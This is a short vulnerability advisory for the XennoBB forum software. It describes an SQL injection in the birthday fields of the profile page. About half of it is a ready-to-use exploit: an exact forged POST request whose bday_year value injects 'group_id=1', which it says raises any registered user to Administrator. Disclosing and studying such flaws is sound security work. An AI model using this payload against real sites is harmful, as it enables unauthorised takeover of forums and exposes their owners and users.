------------------- DESCRIPTION -------------------

An exploit exists in the above mentioned versions of XennoBB which
can be exploited by malicious users to conduct SQL injection attacks.

Input passed to the "bday_day", "bday_month" and "bday_year form
fields is not properly sanitised before being used in an SQL query.
This exploit can lead to manipulation of SQL queries by injecting
arbitary SQL code.

--------------------- EXPLOIT ---------------------

Submit a forged POST request to

/profile.php?section=personal&id={your registered user ID here}

With the following as the POST data:

form_sent=1&form[sex]=a&bday_day=1&bday_month=2&bday_year=", group_id=1, birthday="

Successful exploitation leads to the user group being changed to
that of Administrators.
